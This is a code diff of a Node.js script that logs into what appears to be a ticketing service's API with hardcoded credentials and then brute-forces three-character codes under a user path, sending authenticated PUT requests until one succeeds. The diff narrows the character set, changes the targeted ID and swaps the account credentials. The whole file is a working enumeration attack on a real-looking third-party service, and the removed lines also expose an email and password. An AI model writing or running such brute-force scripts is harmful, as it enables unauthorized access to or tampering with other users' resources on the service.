@@ -4,7 +4,7 @@ const api = axios.create({
     baseURL: "https://api.unticketparabernabeu.com/usuario/"
 });
 
-const options = ["1","2","3","4","5","6","7","8","9","0","A","B","C","D","E","F","G","H","I","J","K","L","M","N","Ñ","O","P","Q","R","S","T","U","V","W","X","Y","Z","a","b","c","d","e","f","g","h","i","j","k","l","m","n","ñ","o","p","q","r","s","t","u","v","w","x","y","z"]
+const options = ["1","2","3","4","5","6","7","8","9","0","A","B","C","D","E","F","G","H","I","J","K","L","M","N","Ñ","O","P","Q","R","S","T","U","V","W","X","Y","Z"]
 
 
 const login = async (email, clave) => {
@@ -18,8 +18,8 @@ const login = async (email, clave) => {
 
 //run main
 const getToken = async () => {
-    const email = "jelax19327@huleos.com"
-    const clave = "1RUX6V*4j?s&"
+    const email = "fsadffa@jiao.co"
+    const clave = "12345678"
     const response = await login(email, clave);
     const token = response.token;
     return token;
@@ -32,10 +32,9 @@ const putApi = async ( url, token ) => {
                 Authorization: `Bearer ${token}`
             }
         });
-        return response.data;
+        return response.status === 200;
     } catch (error) {
-        return false;
-        return error.response;
+        return false
     }
 }
 
@@ -48,7 +47,7 @@ const main = async () => {
     for (let i = 0; i < options.length; i++) {
         for (let j = 0; j < options.length; j++) {
             for (let k = 0; k < options.length; k++) {
-                const url = `1662/2018/${options[i]}${options[j]}${options[k]}`;
+                const url = `2595/2018/${options[i]}${options[j]}${options[k]}`;
                 const response = await putApi(url, token);
                 console.log(url)
                 if (response) {
@@ -72,7 +71,5 @@ const main = async () => {
         console.log("No se encontró ninguna url exitosa")
     }
 }
-
-
 
 main();
